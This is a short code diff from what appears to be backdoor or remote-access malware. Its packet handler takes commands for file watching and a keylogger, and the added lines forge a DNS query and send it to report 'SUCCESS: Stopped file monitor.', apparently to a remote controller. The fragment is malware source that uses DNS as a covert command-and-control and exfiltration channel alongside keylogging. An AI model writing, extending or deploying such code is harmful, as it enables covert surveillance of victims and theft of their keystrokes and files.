@@ -376,6 +376,8 @@ def packet_handler(pkt):
         if argv[0] == WATCH:
             if argv[1] == STOP:
                 MONITOR.shutdown()
+                query = forge_dns_query_stream("SUCCESS: Stopped file monitor.", GENERAL_MSG_IDENTIFICATION)
+                send_dns_query(query)
             else:
                 execute_watch_command(argv[1])
         if argv[0] == KEYLOGGER:
